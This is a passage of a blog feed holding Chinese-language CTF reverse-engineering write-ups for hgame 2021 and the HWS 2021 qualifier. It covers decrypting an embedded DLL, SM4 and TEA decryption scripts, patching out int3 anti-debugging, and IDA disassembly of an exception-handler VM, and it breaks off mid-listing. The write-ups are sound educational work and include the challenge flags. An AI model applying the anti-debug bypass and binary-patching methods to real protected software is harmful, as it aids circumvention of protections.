python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">iv = bytes(i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>))</span><br><span class="line">Cipher = bytes([<span class="number">145</span>, <span class="number">179</span>, <span class="number">193</span>, <span class="number">235</span>, <span class="number">20</span>, <span class="number">93</span>, <span class="number">213</span>, <span class="number">206</span>, <span class="number">58</span>, <span class="number">29</span>, <span class="number">48</span>, <span class="number">228</span>, <span class="number">112</span>, <span class="number">108</span>, <span class="number">107</span>, <span class="number">215</span>,</span><br><span class="line">        <span class="number">105</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">163</span>, <span class="number">165</span>, <span class="number">223</span>, <span class="number">27</span>, <span class="number">253</span>, <span class="number">28</span>, <span class="number">2</span>, <span class="number">137</span>, <span class="number">20</span>, <span class="number">32</span>, <span class="number">122</span>, <span class="number">253</span>,</span><br><span class="line">        <span class="number">36</span>, <span class="number">82</span>, <span class="number">248</span>, <span class="number">169</span>, <span class="number">249</span>, <span class="number">241</span>, <span class="number">107</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">93</span>, <span class="number">80</span>, <span class="number">91</span>, <span class="number">236</span>, <span class="number">66</span>, <span class="number">209</span>, <span class="number">140</span>,</span><br><span class="line">        <span class="number">184</span>, <span class="number">18</span>, <span class="number">207</span>, <span class="number">44</span>, <span class="number">169</span>, <span class="number">105</span>, <span class="number">49</span>, <span class="number">70</span>, <span class="number">253</span>, <span class="number">155</span>, <span class="number">234</span>, <span class="number">222</span>, <span class="number">200</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">105</span>])</span><br><span class="line">key = <span class="string">b&#x27;CryptoFAILUREforRSA2048Key!!!!!!&#x27;</span></span><br><span class="line"></span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">Plain = aes.decrypt(Cipher)</span><br><span class="line">print(Plain)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;cOsm0s_is_still_fight1ng_and_NEVER_GIVE_UP_O0o0o0oO00o00o&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;hgame 2021的逆向部分题解，一道nc题和一道安卓逆向没有做，每周的题目都看了看，做了四分之三左</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="re" scheme="http://example.com/categories/CTF/re/"/>
    
    
    <category term="re" scheme="http://example.com/tags/re/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>go语言学习2（函数，匿名函数，闭包）</title>
    <link href="http://example.com/2021/02/02/go/GoStudy-2/"/>
    <id>http://example.com/2021/02/02/go/GoStudy-2/</id>
    <published>2021-02-01T16:34:19.104Z</published>
    <updated>2021-02-05T06:37:34.465Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

</summary>
      
    
    
    
    <category term="go" scheme="http://example.com/categories/go/"/>
    
    
    <category term="编程" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>HWS计划2021硬件安全冬令营线上选拔赛</title>
    <link href="http://example.com/2021/02/01/CTF/wp/HWSCTF/"/>
    <id>http://example.com/2021/02/01/CTF/wp/HWSCTF/</id>
    <published>2021-02-01T10:51:54.222Z</published>
    <updated>2021-05-07T11:25:35.639Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p><img src="HWSCTF.assets/image-20210201185722500.png"></p><p>一道hook题，ida打开代码还是比较清晰的，首先判断长度然后在加密，但是我没有搞清楚这个hook的流程，听别的师傅说的在CRT的时候，从r3到r0时候hook的😥（听的不是很懂），但是我瞎找找到这两个函数</p><p><strong>资源解密</strong></p><p><img src="HWSCTF.assets/image-20210201190115121.png"></p><p><strong>资源加载</strong></p><p><img src="HWSCTF.assets/image-20210201190013052.png"></p><p>可以看出程序加载了一个叫<strong>CIPHER_DLL</strong>的资源,这个资源其实就是经过加密的DLL，我用<strong>ResourceHacker</strong>(一个可以查看程序资源的工具)来查看程序中的资源</p><p><img src="HWSCTF.assets/image-20210201190453201.png"></p><p>程序中确实有一个叫<strong>CIPHER_DLL</strong>的资源,且这个资源需要解密才能使用,图中**wow!**就是证明,把这个资源的二进制文件提出来,在解密回去,得到一个DLL</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">//解密资源</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ResourceDecrypt</span>():</span></span><br><span class="line">    filepath = <span class="string">&#x27;C:\\Users\\86180\\Desktop\\CIPHER_DLL101&#x27;</span></span><br><span class="line">    dllpath = <span class="string">&#x27;C:\\Users\\86180\\Desktop\\DLL.dll&#x27;</span></span><br><span class="line">    key = <span class="string">&#x27;wow!&#x27;</span></span><br><span class="line">    size = os.path.getsize(filepath) <span class="comment"># 获得文件大小</span></span><br><span class="line">    <span class="keyword">with</span> open(filepath, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> cipher_stream:</span><br><span class="line">        <span class="keyword">with</span> open(dllpath, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> dll_stream:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(size):</span><br><span class="line">                data = struct.unpack(<span class="string">&#x27;B&#x27;</span>, cipher_stream.read(<span class="number">1</span>))[<span class="number">0</span>] ^ ord(key[i%<span class="number">4</span>])</span><br><span class="line">                dll_stream.write(struct.pack(<span class="string">&#x27;B&#x27;</span>, data))</span><br></pre></td></tr></table></figure><p>把DLL用ida打开,查看加密函数,字符串已经告诉我们是SM4加密,没有魔改.</p><p><img src="HWSCTF.assets/image-20210201190932018.png"></p><p><a href="https://github.com/yang3yen/pysm4">SM4Github代码链接</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida <span class="keyword">import</span> ida_bytes</span><br><span class="line"><span class="keyword">import</span> pysm4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从ida中提取加密后的数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump_ida_data</span>():</span></span><br><span class="line">    addr = <span class="number">0x00BFA808</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        res.append(get_byte(addr + i))</span><br><span class="line">    print(bytes(res).hex())</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 利用GitHub上找的sm4脚本,写的解密函数</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>():</span></span><br><span class="line">    string = <span class="string">b&#x27;Ez_5M4_C1pH@r!!!&#x27;</span>.hex()</span><br><span class="line">    key = <span class="number">0x457a5f354d345f433170484072212121</span></span><br><span class="line">    cipher1 = <span class="number">0xea6358b78ce2a1e9c5298f53e8083259</span></span><br><span class="line">    cipher2 = <span class="number">0xaf1b67aed9dacfc472ffb1ec7673f306</span></span><br><span class="line">    plain1 = hex(pysm4.decrypt(cipher1, key))[<span class="number">2</span>:]</span><br><span class="line">    plain2 = hex(pysm4.decrypt(cipher2, key))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(plain1),<span class="number">2</span>):</span><br><span class="line">        print(chr(int(plain1[i:i+<span class="number">2</span>],<span class="number">16</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(plain1),<span class="number">2</span>):</span><br><span class="line">        print(chr(int(plain2[i:i+<span class="number">2</span>],<span class="number">16</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># flag&#123;42b061b4cb41cfa89ca78047bde1856e&#125;</span></span><br></pre></td></tr></table></figure><p><img src="HWSCTF.assets/image-20210201191532668.png" alt="image-20210201191532668"></p><h3 id="child-protect"><a href="#child-protect" class="headerlink" title="child_protect"></a>child_protect</h3><p>参考看雪的一篇文章：<a href="https://bbs.pediy.com/thread-95082.htm">https://bbs.pediy.com/thread-95082.htm</a></p><p>这道题考的是双进程守护问题，上面的文章和这道题类似，但是难点在于调试。</p><p>ida打开后发现主函数无法正常反编译，而且看到了int3中断异常指令。由于是双进程守护，需要找到创建子进程的地方</p><p><img src="HWSCTF.assets/image-20210202220203991.png"></p><p>通过搜索CreateProcess函数，确定子进程由函数sub_413670创建</p><p><img src="HWSCTF.assets/image-20210202220516727.png"></p><p>继续跟踪，确定了两个函数调用子进程，分别是sub_413BE0和sub_413950</p><p>而函数sub_413950是一个关键函数，他对子进程做了修改。如果想让ida正确的反编译，我们需要nop掉所有的int3指令，且按照程序修改部分指令，这里我用010Editor进行修改。</p><p><img src="HWSCTF.assets/image-20210202221029165.png"></p><p>首先找到所有的int3指令</p><p><img src="HWSCTF.assets/image-20210202221659699.png"></p><p><img src="HWSCTF.assets/image-20210202221750385.png"></p><p><img src="HWSCTF.assets/image-20210202221833555.png"></p><p><img src="HWSCTF.assets/image-20210202222047820.png"></p><p>上图就是需要我们首先nop掉的地方，用010Editor修改后再次用ida打开可以发现主函数已经可以正常反编译，但是还不能够动态调试，</p><p>因为所有的过程都是在子进程中进行，但是我们现在已经修改了父进程的数据和子进程一样，所以可以跳过调用子进程的步骤，这需要修改一部分数据。</p><p><img src="HWSCTF.assets/image-20210202222323468.png"></p><p>经过多次下断点调试后，定位到函数sub_413D10，修改过后就可以进行调试，但是还有一个坑。。</p><p><img src="HWSCTF.assets/image-20210202223254218.png"></p><p>每次调试到这里的时候都会闪退，无论怎么调都没有用，最后我选择的办法是直接patch掉调用这个函数的指令，因为这步比较简单，且不影响后面的数据。</p><p><img src="HWSCTF.assets/image-20210202223522827.png"></p><p>在可以动调后，就可以分析算法了，算法有两处，一处异或，一处tea加密，异或函数我将他pach，直接看tea处</p><p><img src="HWSCTF.assets/image-20210202222546684.png" alt="异或"></p><p><img src="HWSCTF.assets/image-20210202222610483.png" alt="tea"></p><p>tea加密的key是在运行时生成的，但是如果不动态调试也可以直接复制整个函数跑一遍也可以，我喜欢动态调试（懒）</p><p><img src="HWSCTF.assets/image-20210202224017437.png"></p><p>生成了8个数据，但是只用到了前四个，后面只需要找到加密后的数据就ok了，这里我用idapython</p><p><img src="HWSCTF.assets/image-20210202224217028.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DumpCipher</span>():</span></span><br><span class="line">    addr = []</span><br><span class="line">    res = []</span><br><span class="line">    start = <span class="number">0x4122C8</span></span><br><span class="line">    end = <span class="number">0x4123AE</span></span><br><span class="line">    curr_addr = start</span><br><span class="line">    dword = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> curr_addr &lt;= end:</span><br><span class="line">        addr.append(curr_addr)</span><br><span class="line">        curr_addr = idc.next_head(curr_addr,end)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">4</span>==<span class="number">0</span> <span class="keyword">and</span> i != <span class="number">0</span>:</span><br><span class="line">            print(dword)</span><br><span class="line">            res.append(int(dword, <span class="number">16</span>))</span><br><span class="line">            dword = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        data = idc.print_operand(addr[i], <span class="number">1</span>).replace(<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> len(data) == <span class="number">1</span>:</span><br><span class="line">            data = <span class="string">&#x27;0&#x27;</span> + data</span><br><span class="line">        <span class="keyword">elif</span> len(data) == <span class="number">3</span>:</span><br><span class="line">            data = data[<span class="number">1</span>:]</span><br><span class="line">        dword = dword + data</span><br><span class="line">    <span class="comment"># print(dword)</span></span><br><span class="line">    res.append(int(dword, <span class="number">16</span>))</span><br><span class="line">    print(res)</span><br></pre></td></tr></table></figure><p><img src="HWSCTF.assets/image-20210202224331594.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TEA_decrypt</span><span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> sum = <span class="number">0xC6EF3720</span>, delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">XOR</span><span class="params">(<span class="keyword">uint32_t</span> *arr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> sum = <span class="number">0x73FF8CA6</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        arr[i] ^= sum;</span><br><span class="line">        sum -= <span class="number">0x50FFE544</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> key[<span class="number">4</span>] = &#123; <span class="number">0x82aba3fe</span>, <span class="number">0xac1ddca8</span>, <span class="number">0x87ec6b60</span>, <span class="number">0xa2394568</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> c1[<span class="number">2</span>] = &#123; <span class="number">3991505723</span>, <span class="number">3531991019</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> c2[<span class="number">2</span>] = &#123; <span class="number">1360416890</span>, <span class="number">2984008969</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> c3[<span class="number">2</span>] = &#123; <span class="number">1169078549</span>, <span class="number">1301151568</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> c4[<span class="number">2</span>] = &#123; <span class="number">3739270283</span>, <span class="number">2612854497</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> v = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    TEA_decrypt(c1, key);</span><br><span class="line">    TEA_decrypt(c2, key);</span><br><span class="line">    TEA_decrypt(c3, key);</span><br><span class="line">    TEA_decrypt(c4, key);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint32_t</span> arr[] = &#123; <span class="number">0x3e9affcb</span>, <span class="number">0x478dce18</span>, <span class="number">0xb891a541</span>, <span class="number">0xc191b885</span>, <span class="number">0x6b9a84ff</span>, <span class="number">0xad61703e</span>, <span class="number">0xeb5f6c7d</span>, <span class="number">0x62772dbb</span> &#125;;</span><br><span class="line">    XOR(arr);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//打印的是flag的16进制表示形式，再用python转成字符串</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="HWSCTF.assets/image-20210202224635428.png"></p><p><em>flag: Mesmerizing_And_Desirable_As_wjq</em></p><h3 id="Enigma"><a href="#Enigma" class="headerlink" title="Enigma"></a>Enigma</h3><p>这题有意思</p><p>异常处理反调试，函数sub_AE10C0调用了SetUnhandledExceptionFilter函数，意思就是发生异常时调用注册的函数，看看注册的函数</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210204132938000.png"></p><p>注册的函数是一个虚拟机，但是这个虚拟机很特殊，里面的handl是加减运算和位运算，参数是各种寄存器</p><p><img src="HWSCTF.assets/image-20210204133850534.png"></p><p><img src="HWSCTF.assets/image-20210204133647983.png"></p><p>回到函数sub_AE10C0发现了C7这个字节码触发非法指令异常，然后调用注册的函数相当于用那个虚拟机模拟了一些汇编指令，直接还原后静态看汇编就OK</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">           push    ebp</span><br><span class="line">.text:004018F1                 mov     ebp, esp</span><br><span class="line">.text:004018F3                 push    ebx</span><br><span class="line">.text:004018F4                 push    esi</span><br><span class="line">.text:004018F5                 push    edi</span><br><span class="line">.text:004018F6                 push    offset sub_401630</span><br><span class="line">.text:004018FB                 call    ds:SetUnhandledExceptionFilter</span><br><span class="line">.text:004018FB ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401901                 db 0C7h                 ; and eax, 0</span><br><span class="line">.text:00401902                 db 0FFh</span><br><span class="line">.text:00401903                 db    4                 </span><br><span class="line">.text:00401904                 db    1</span><br><span class="line">.text:00401905                 db    0</span><br><span class="line">.text:00401906 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401906                 xor     ecx, ecx</span><br><span class="line">.text:00401908</span><br><span class="line">.text:00401908 loc_401908:                             ; CODE XREF: .text:00401922↓j</span><br><span class="line">.text:00401908                 cmp     ecx, 20h ; &#39; &#39;</span><br><span class="line">.text:0040190B                 jge     short loc_401924</span><br><span class="line">.text:0040190B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040190D                 db 0C7h                 ; add eax, 11h</span><br><span class="line">.text:0040190E                 db 0FFh                    </span><br><span class="line">.text:0040190F                 db    0</span><br><span class="line">.text:00401910                 db    1</span><br><span class="line">.text:00401911                 db  11h</span><br><span class="line">.text:00401912                 db 0C7h                 ; and eax,1Fh</span><br><span class="line">.text:00401913                 db 0FFh</span><br><span class="line">.text:00401914                 db    4</span><br><span class="line">.text:00401915                 db    1</span><br><span class="line">.text:00401916                 db  1Fh</span><br><span class="line">.text:00401917 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401917                 mov     dword ptr (byte_457A4C+24h)[ecx*4], eax</span><br><span class="line">.text:00401917 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040191E                 db 0C7h                  ; inc ecx</span><br><span class="line">.text:0040191F                 db 0FFh</span><br><span class="line">.text:00401920                 db    2</span><br><span class="line">.text:00401921                 db    3</span><br><span class="line">.text:00401922 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401922                 jmp     short loc_401908</span><br><span class="line">.text:00401924 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401924</span><br><span class="line">.text:00401924 loc_401924:                             ; CODE XREF: .text:0040190B↑j</span><br><span class="line">.text:00401924                 xor     ecx, ecx</span><br><span class="line">.text:00401926</span><br><span class="line">.text:00401926 loc_401926:                             ; CODE XREF: .text:00401956↓j</span><br><span class="line">.text:00401926                 cmp     ecx, 20h ; &#39; &#39;</span><br><span class="line">.text:00401929                 jge     short loc_401958</span><br><span class="line">.text:0040192B                 mov     ebx, dword ptr (byte_457A4C+24h)[ecx*4]</span><br><span class="line">.text:00401932                 mov     edx, dword ptr (byte_457A4C+28h)[ecx*4]</span><br><span class="line">.text:00401939                 mov     al, byte_457A4C[edx]</span><br><span class="line">.text:0040193F                 mov     byte_4579E0[ebx], al</span><br><span class="line">.text:00401945                 mov     al, byte_457A4C[ebx]</span><br><span class="line">.text:0040194B                 mov     byte_4579E0[edx], al</span><br><span class="line">.text:0040194B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401951                 db 0C7h</span><br><span class="line">.text:00401952                 db 0FFh                 ; add ecx, 2</span><br><span class="line">.text:00401953                 db    0</span><br><span class="line">.text:00401954                 db    3</span><br><span class="line">.text:00401955                 db    2</span><br><span class="line">.text:00401956 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401956                 jmp     short loc_401926</span><br><span class="line">.text:00401958 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401958</span><br><span class="line">.text:00401958 loc_401958:                             ; CODE XREF: .text:00401929↑j</span><br><span class="line">.text:00401958                 xor     ecx, ecx</span><br><span class="line">.text:0040195A</span><br><span class="line">.text:0040195A loc_40195A:                             ; CODE XREF: .text:00401992↓j</span><br><span class="line">.text:0040195A                 cmp     ecx, 20h ; &#39; &#39;</span><br><span class="line">.text:0040195D                 jge     short loc_401994</span><br><span class="line">.text:0040195F                 mov     bl, byte_4579E0[ecx]</span><br><span class="line">.text:0040195F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401965                 db 0C7h                 ; and ebx, 1Fh</span><br><span class="line">.text:00401966                 db 0FFh</span><br><span class="line">.text:00401967                 db    4</span><br><span class="line">.text:00401968                 db    2</span><br><span class="line">.text:00401969                 db  1Fh</span><br><span class="line">.text:0040196A                 db 0C7h                 ; shl bl, 3</span><br><span class="line">.text:0040196B                 db 0FFh</span><br><span class="line">.text:0040196C                 db    7</span><br><span class="line">.text:0040196D                 db    2</span><br><span class="line">.text:0040196E                 db    3</span><br><span class="line">.text:0040196F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040196F                 mov     esi, ecx</span><br><span class="line">.text:00401971                 inc     esi</span><br><span class="line">.text:00401972                 and     esi, 1Fh</span><br><span class="line">.text:00401975                 mov     dl, byte_4579E0[esi]</span><br><span class="line">.text:0040197B                 and     dl, 0E0h</span><br><span class="line">.text:0040197E                 and     edx, 0FFh</span><br><span class="line">.text:0040197E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401984                 db 0C7h                  ; shr dl, 5 </span><br><span class="line">.text:00401985                 db 0FFh</span><br><span class="line">.text:00401986                 db    8</span><br><span class="line">.text:00401987                 db    4</span><br><span class="line">.text:00401988                 db    5</span><br><span class="line">.text:00401989 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401989                 or      bl, dl</span><br><span 